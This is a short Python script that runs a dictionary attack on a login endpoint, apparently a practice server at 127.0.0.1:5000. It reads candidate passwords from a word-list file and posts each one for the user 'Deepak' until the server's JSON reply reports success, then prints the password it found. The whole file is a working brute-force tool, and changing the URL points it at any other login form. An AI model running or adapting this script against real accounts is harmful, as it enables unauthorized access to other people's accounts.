import json
from requests import post as POST

URL = 'http://127.0.0.1:5000/login'


def famous_passwords():
	with open('dictonary.txt', 'r') as f:
		all_password = f.read().split('\n')
	return all_password

if __name__ == '__main__':
	success = False
	guess_password = 0
	for guess_password in famous_passwords():
		response = POST(URL, data={'username': 'Deepak', 'password': str(guess_password)})
		success = json.loads(response.text).get('success')
		if success:
			print(f'Password is {guess_password}')
			break